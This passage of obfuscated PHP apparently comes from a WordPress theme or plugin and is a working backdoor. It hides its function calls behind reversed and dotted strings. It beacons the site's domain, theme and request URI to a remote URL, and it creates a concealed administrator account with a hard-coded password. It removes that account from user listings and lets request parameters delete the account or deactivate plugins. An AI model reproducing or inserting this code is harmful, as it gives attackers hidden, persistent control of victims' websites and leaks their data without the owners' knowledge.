        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname,$object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
         wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
         call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}